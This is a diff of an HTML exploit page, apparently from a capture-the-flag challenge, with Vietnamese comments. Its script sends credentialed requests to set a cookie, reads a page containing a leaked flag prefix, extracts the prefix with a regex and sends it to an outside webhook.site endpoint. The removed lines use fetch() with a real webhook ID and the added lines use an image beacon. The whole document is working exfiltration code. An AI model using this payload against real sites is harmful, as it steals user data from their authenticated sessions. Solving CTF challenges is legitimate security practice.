@@ -1,29 +1,22 @@
+<!-- static/payload.html -->
 <!DOCTYPE html>
 <html>
-<head><title>Leak Page</title></head>
+<head><meta charset="utf-8"><title>Local Exploit</title></head>
 <body>
 <script>
 (async () => {
-  // Gửi POST guess + note tới localhost để set cookie 'best'
-  await fetch('http://127.0.0.1:5000/guess', {
+  // 1) POST /guess với một guess bất kỳ để set cookie 'best'
+  await fetch('/guess', {
     method: 'POST',
     credentials: 'include',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      guess: 'NHNC{N_ooooooo}',
-      note: 'your_note_here' // note tùy ý, có thể để trống hoặc hex string
-    })
+    body: JSON.stringify({ guess: 'NHNC{', note: '' })
   });
-
-  // Lấy nội dung /inner.html (có best-prefix chứa phần flag)
-  const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
-  const html = await res.text();
-
-  // Dùng regex lấy best-prefix (đoạn flag bị leak)
+  // 2) GET /inner.html để đọc best-prefix
+  const html = await fetch('/inner.html', { credentials: 'include' }).then(r=>r.text());
   const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
-
-  // Gửi prefix ra webhook ngoài để bạn xem
-  await fetch('http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(prefix));
+  // 3) Leak ra webhook
+  new Image().src = 'https://webhook.site/YOUR-UUID?flag='+encodeURIComponent(prefix);
 })();
 </script>
 </body>
